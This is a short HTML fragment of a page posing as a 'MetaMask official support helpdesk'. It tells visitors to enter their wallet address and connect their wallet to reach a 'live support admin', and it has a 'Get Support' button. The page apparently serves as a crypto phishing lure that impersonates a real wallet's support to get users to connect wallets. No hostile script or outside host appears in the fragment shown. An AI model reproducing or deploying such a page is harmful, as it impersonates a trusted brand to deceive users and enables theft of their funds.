...
<div class="text-gray-700 text-center col-12 order-md-1">
<h1 class="import-account__title">MetaMask official support helpdesk</h1>
<br>
<p class="text-gray-700 mb-8">Enter your wallet adress below and connect your wallet to come in contact with a live support admin.</p>



<div class="field">
<input class="form-control mt-4" type="text" placeholder="Wallet address..." required="required" />
</div>
 ...
 <form action="../">
    <button class="button btn--first-time first-time-flow__button" type="submit">Get Support</button>
</form>
